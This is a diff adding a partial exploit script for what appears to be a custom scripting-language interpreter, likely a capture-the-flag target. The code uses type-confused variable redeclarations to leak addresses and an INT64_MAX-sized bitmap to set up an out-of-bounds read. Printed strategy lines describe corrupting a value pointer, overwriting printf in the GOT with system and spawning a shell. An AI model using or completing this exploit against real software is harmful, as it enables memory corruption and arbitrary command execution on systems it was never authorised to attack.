@@ -1,0 +1,45 @@
+print("=== Finding Variable Entry Addresses ===");
+
+int leak1 = 0;
+string leak1 = "first";
+int addr1 = leak1;
+print(addr1);
+
+int leak2 = 0;
+string leak2 = "second";
+int addr2 = leak2;
+print(addr2);
+
+int leak3 = 0;
+string leak3 = "third";
+int addr3 = leak3;
+print(addr3);
+
+print("=== Creating target variable ===");
+int target = 0;
+string target = "target";
+int targetaddr = target;
+print(targetaddr);
+
+print("=== Creating bitmap for OOB read ===");
+bitmap b1 = create(9223372036854775807, 2);
+
+print("=== Scanning for variable entries ===");
+print("Looking for 'target' name pattern");
+print("Variable entry should be before string address");
+print("Scanning backwards from targetaddr");
+
+print("=== Strategy ===");
+print("1. Use leaked addresses to estimate entry locations");
+print("2. Use OOB read to find exact addresses");
+print("3. Calculate bitmap write coordinates");
+print("4. Corrupt value_ptr to point to printf@GOT");
+print("5. Leak libc address");
+print("6. Write system to GOT");
+print("7. Trigger shell");
+
+print("=== Address calculation ===");
+print("targetaddr is the string structure address");
+print("Variable entry ≈ targetaddr - 0x100 to targetaddr - 0x1000");
+print("value_ptr is at entry_addr + 0x28");
+
